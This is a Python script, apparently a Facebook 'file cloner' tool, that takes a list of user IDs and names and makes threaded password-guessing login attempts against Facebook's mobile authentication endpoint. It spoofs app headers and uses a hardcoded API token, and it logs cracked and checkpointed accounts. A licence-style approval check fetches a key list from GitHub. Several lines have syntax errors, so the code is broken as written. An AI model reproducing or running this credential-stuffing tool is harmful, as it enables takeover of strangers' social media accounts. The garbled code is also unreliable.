#SCRIPT WRITER : ALIEN
#GITHUB : ROX-AK
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random
import httpx
import json
import sys
#----------color----------#
R = '\033[1;91m'
W = '\033[1;97m'
G = '\033[1;32m' 
Y = '\033[1;33m'
B = '\033[1;34m'
O = '\033[1;35m'
#----------logo----------#
logo = ('''\033[1;32m'
            ___                        
           /   |  ____ ___  ____ _____ 
          / /| | / __ `__ \/ __ `/ __ \
  
         / ___ |/ / / / / / /_/ / / / /
        /_/  |_/_/ /_/ /_/\__,_/_/ /_/ \033[1;37m''')
#----------used_values----------#
tlab = ('''\033[1;32m                                  
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┏━━━━━━━━━━━━━━━━━┓
  ┃ ┏━━[+]  AUTHOR   ➤ Aman khan ┃TOOL➤ FILE CLONER  ┃
  ┃ ┣━━[+]  GITHUB   ➤ 5UP3R1    ┃VERSION ➤ 1.0.0  ┃
  ┃ ┣━━[+]  TYPE     ➤ FREE      ┗━━━━━━━━━━━━━━━━━┃
  ┃ ┣━━[+]  NETWORK  ➤ DATA AND WIFI               ┃
  ┃ ┣━━[+]  STATUS   ➤ Active...                   ┃
  ┃ ┣━━[+]  FACEBOOK ➤ sorry1314                   ┃
  ┃ ┗━━[+]  TELEGRAM ➤ @aman_sdp                   ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;37m''')
def line():
    print(42*'-')

#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(42*'-')
    print(tlab)
    print(42*'-')
#----------menu----------#
def main():
    clear()
    print(' \n\n\033[1;92m[01] FILE CLONING ')
    print(' [00] EXIT ')
    line()
    option = input(' [??] CHOICE MENU : \033[1;37m')
    if option in ['1','01']:
        __file__()
    else:
        exit(' THANKS FOR USING !! ')
#----------file----------#
def __file__():
    clear()
    filex = input(' [??] ENTER FILE PATH : ')
    try:
    	fo = open(filex'r').read().splitlines()
    except FileNotFoundError:
        print('\033[1;91m FILE NOT FOUND !! \033[1;37m');slp(2)
        __file__()
    clear()
    try:
        pas_limit = int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit = 1
        line()
        pas_list = []
        for i in range(pas_limit):
            pasx = input(' ENTER PASSWORD {i+1} : ')
            pas_list.append(pasx)
        with ted(max_workers=30) as Alien:
            tl = str(len(fo))
            clear()
            print(' TOTAL ACCOUNT '+tl)
            print(' USE AIRPLANE MODE FOR SPEED UP ')
            line()
            for user in fo:
                ids,names = user.split('|')
                passlist = pas_list
                Alien.submit(m1,ids,names.passlist)
        line()
        print(' THE PROCESS HAS BEEN COMPLETE !! ')
        input( 'PRESS ENTER TO BACK : ')
        main()
loop=0
oks=[]
cps=[]
#----------method----------#
def m1(ids,names,passlist):
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
        	sys.stdout.write('\r\r [CLONING] %s|OK:%s '%(loop,len(oks)));sys.stdout.flush()
            pas = pw.replace('frist',fn.lower()).replace('Frist',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('names'.name.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            headers={'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m [OK] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;91m [CP] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------approval----------#
def approval():
    UMO='AmaN-'
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print('\033[1;91mChecking Approval...')
    AMAN=requests.get("https://github.com/5UP3R1/FILE/blob/main/Appove.ax").text
    if id in AMAN:
        main()
    else:
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/sorry1314')
        slp(3)
        
        clear()
        print('\n\n\n\t\033[1;91mYOUR KEY IS NOT APPROVED !!')
        print('\n\n\t\033[1;32mCOPY AND SEND KEY TO ADMIN.')
        print('\n\n\033[1;32m YOUR KEY : '+UMO+id)
        input(' PRESS ENTER TO SEND KEY : \033[1;37m')
        os.system('xdg-open https://www.facebook.com/sorry1314')
        approval()
#----------end----------#
approval()
